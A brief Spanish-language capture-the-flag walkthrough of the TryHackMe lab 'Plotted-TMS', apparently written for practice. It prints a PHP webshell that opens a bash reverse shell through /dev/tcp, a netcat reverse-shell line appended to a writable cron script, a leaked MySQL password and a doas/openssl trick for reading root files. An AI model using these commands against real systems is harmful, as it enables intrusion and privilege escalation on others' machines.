# Plotted-TMS - TryHackMe
**IP:** 10.10.131.2

## Enumeración
El panel de administración está en un puerto HTTP alternativo:
```
http://10.10.131.2:445/management/admin/
```

## Foothold - webshell
Inyectamos/subimos una webshell PHP en el panel:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<mi_ip>/1234 0>&1'"); ?>
```
Shell como `www-data`. En `initialize.php` hay credenciales de MySQL:
```bash
cat initialize.php
mysql -u tms_user -p    # Password@123
```

## Escalada - cron escribible → doas
Un cron ejecuta `backup.sh`, que es escribible:
```bash
echo 'nc -e /bin/bash <mi_ip> 7070' >> backup.sh
```
Obtenemos shell como el usuario del cron. Con `doas` leemos archivos como root:
```bash
find / -perm -4000 -type f 2>/dev/null
doas openssl enc -in /root/root.txt
```
Flag de root.
